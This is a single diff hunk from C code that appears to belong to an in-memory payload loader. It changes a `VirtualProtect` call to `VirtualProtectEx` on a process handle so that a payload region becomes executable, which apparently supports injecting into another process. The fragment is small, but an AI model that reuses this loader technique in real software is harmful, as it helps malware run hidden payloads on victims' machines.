@@ -42,7 +42,7 @@ MemoryInfo memory_run(LPVOID PayloadAddress, SIZE_T PayloadSize) {
 		return memInfo;
 	}
 	DWORD old = 0;
-	BOOL check = g_ldr->apis->VirtualProtect(addr, PayloadSize, PAGE_EXECUTE_READ, &old);
+	BOOL check = g_ldr->apis->VirtualProtectEx(hProc, addr, PayloadSize, PAGE_EXECUTE_READ, &old);
 	if (!check) {
 		DBGA("[!] VirtualProtect Failed | %d\n", GetLastError());
 		memInfo.ok = FALSE;
